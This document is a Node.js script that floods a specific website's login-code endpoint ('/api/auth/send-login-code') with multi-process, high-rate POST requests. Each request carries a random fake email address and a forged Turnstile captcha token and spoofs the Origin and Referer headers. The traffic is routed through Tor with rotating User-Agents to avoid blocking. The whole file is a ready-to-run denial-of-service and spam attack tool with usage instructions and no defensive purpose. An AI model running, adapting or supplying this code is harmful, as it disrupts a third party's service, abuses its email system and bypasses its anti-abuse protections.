const cluster = require("cluster");
const os = require("os");
const axios = require("axios");
const fs = require("fs");
const { SocksProxyAgent } = require("socks-proxy-agent");

if (process.argv.length < 5) {
    console.log("Usage: node raymix.js <duration_seconds> <rps> <connections> [workers]");
    console.log("Example: node raymix.js 300 800 200");
    process.exit(0);
}

const DURATION = parseInt(process.argv[2]);
const RPS = parseInt(process.argv[3]);
const CONNECTIONS = parseInt(process.argv[4]);
const WORKERS = parseInt(process.argv[5] || os.cpus().length);

const DEBUG = true; // ← Set to false to reduce logging

const TOR_PROXY = "socks5://127.0.0.1:9050";
const agent = new SocksProxyAgent(TOR_PROXY);

let userAgents = [];
function generateMockTurnstileToken() {
    const randStr = (len) => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        let result = '';
        for (let i = 0; i < len; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    };
    const part1 = '0.' + randStr(250);
    const part2 = randStr(22);
    const part3 = randStr(64);
    return `${part1}.${part2}.${part3}`;
}

try {
    userAgents = fs.readFileSync("user-agents.txt", "utf8")
                   .split("\n")
                   .map(ua => ua.trim())
                   .filter(ua => ua.length > 20);
    console.log(`✅ Loaded ${userAgents.length} User-Agents`);
} catch (e) {
    console.error("user-agents.txt not found, using default");
    userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
}

function randomString(len = 12) {
    return Math.random().toString(36).substring(2, len + 2);
}

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// ====================== Tor IP Debug Helper ======================
async function getCurrentTorIP() {
    try {
        const res = await axios.get("https://api.ipify.org?format=json", {
            httpsAgent: agent,
            timeout: 5000
        });
        return res.data.ip;
    } catch (e) {
        return "UNKNOWN";
    }
}

// ====================== MASTER ======================
if (cluster.isPrimary) {
    console.log("\n=== RAW-MIX STYLE ULTRA FREEZE SPAM (DEBUG ENABLED) ===");
    console.log(`Target     : /api/auth/send-login-code`);
    console.log(`Duration   : ${DURATION} seconds`);
    console.log(`RPS        : ${RPS}`);
    console.log(`Connections: ${CONNECTIONS}`);
    console.log(`Workers    : ${WORKERS}\n`);

    let totalReq = 0;
    let totalOK = 0;
    let totalErr = 0;

    for (let i = 0; i < WORKERS; i++) cluster.fork();

    for (const id in cluster.workers) {
        cluster.workers[id].on("message", (msg) => {
            totalReq += msg.req || 0;
            totalOK += msg.ok || 0;
            totalErr += msg.err || 0;
        });
    }

    setTimeout(() => {
        for (const id in cluster.workers) cluster.workers[id].kill();
        const avgRPS = Math.round(totalReq / DURATION);
        console.log("\n=== FINAL RESULTS ===");
        console.log(`Total Requests : ${totalReq}`);
        console.log(`Success        : ${totalOK}`);
        console.log(`Errors         : ${totalErr}`);
        console.log(`Average RPS    : ${avgRPS}`);
        process.exit(0);
    }, DURATION * 1000);

    return;
}

// ====================== WORKER ======================
(async () => {
    let reqCount = 0;
    let okCount = 0;
    let errCount = 0;

    // Initial Tor IP
    let lastTorIP = await getCurrentTorIP();
    console.log(`[Worker ${process.pid}] 🚀 Initial Tor IP: ${lastTorIP}`);

    // Periodic Tor IP check
    const ipCheckInterval = setInterval(async () => {
        const currentIP = await getCurrentTorIP();
        if (currentIP && currentIP !== lastTorIP) {
            console.log(`[Worker ${process.pid}] 🔥 Tor IP CHANGED to: ${currentIP}`);
            lastTorIP = currentIP;
        } else if (DEBUG) {
            console.log(`[Worker ${process.pid}] Tor IP: ${currentIP}`);
        }
    }, 12000);

    const INTERVAL = 100;
    const PER_TICK = Math.ceil(RPS / (1000 / INTERVAL));

    const endTime = Date.now() + DURATION * 1000;

    while (Date.now() < endTime) {
        const batch = [];

        for (let i = 0; i < PER_TICK; i++) {
            const rand = randomString(10);
            const email = `${rand}@outlook.com`;
            const turnstyletoken = generateMockTurnstileToken();

            batch.push(
                axios.post("https://api.aryankaushik.space/api/auth/send-login-code", 
                {
                    email: email,
                    turnstileToken: turnstyletoken
                }, {
                    httpsAgent: agent,
                    timeout: 8000,
                    headers: {
                        "Content-Type": "application/json",
                        "User-Agent": getRandomUserAgent(),
                        "Origin": "https://aeroweb.aryankaushik.space",
                        "Referer": "https://aeroweb.aryankaushik.space/"
                    }
                })
                .then((response) => {
                    okCount++;
                    reqCount++;
                    if (DEBUG && Math.random() < 0.05) { // sample ~5% of successes
                        console.log(`[Worker ${process.pid}] ✅ [${response.status}] Success | ${JSON.stringify(response.data).slice(0, 150)}`);
                    }
                })
                .catch((error) => {
                    errCount++;
                    reqCount++;
                    if (DEBUG) {
                        const status = error.response ? error.response.status : "TIMEOUT/NO_RESPONSE";
                        const body = error.response && error.response.data 
                            ? JSON.stringify(error.response.data).slice(0, 300) 
                            : error.message;
                        console.log(`[Worker ${process.pid}] ❌ [${status}] Error | ${body}`);
                    }
                })
            );
        }

        await Promise.all(batch);
        await new Promise(r => setTimeout(r, INTERVAL));
    }

    clearInterval(ipCheckInterval);
    process.send({ req: reqCount, ok: okCount, err: errCount });
    process.exit(0);
})();
